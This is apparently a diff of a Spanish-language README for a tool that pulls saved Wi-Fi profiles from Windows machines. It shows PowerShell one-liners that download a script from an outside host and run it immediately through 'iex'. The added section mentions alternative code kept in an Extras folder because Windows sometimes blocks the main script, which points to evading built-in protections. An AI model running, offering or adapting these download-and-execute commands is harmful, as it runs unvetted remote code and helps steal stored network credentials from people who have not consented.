@@ -25,3 +25,5 @@ iwr -useb on-get-wlanprofiles.migzam.com | iex
 ```
 powershell iex ((New-Object System.Net.WebClient).DownloadString('http://on-get-wlanprofiles.migzam.com'))
 ```
+# Extras
+En la carpeta Extras se encuentras alternativas al codigo principal ya que windows en ocaciones bloquea el script.
